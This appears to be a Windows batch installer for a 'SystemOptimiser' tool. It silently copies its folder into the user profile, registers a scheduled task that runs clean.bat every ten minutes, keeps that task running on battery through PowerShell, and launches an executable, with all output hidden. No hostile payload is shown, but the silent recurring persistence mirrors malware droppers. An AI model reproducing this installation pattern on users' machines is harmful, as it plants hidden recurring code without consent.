@echo off 
cd /d %~dp0 
set "taskname=SystemOptimiser" 
set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;" 
set "dir=%USERPROFILE%\SystemOptimiser" 

rmdir /s /q "%dir%" > nul 2> nul
xcopy "%cd%" "%dir%" /E /I /Y > nul 2> nul

schtasks /create /tn "%taskname%" /tr "\"%dir%\clean.bat\"" /sc minute /mo 10 /st 00:00:00 /f > nul 2> nul
powershell -command %tasksettings%"Set-ScheduledTask -TaskName %taskname% -Settings $TaskSettings" > nul

SystemOptimiser.exe 1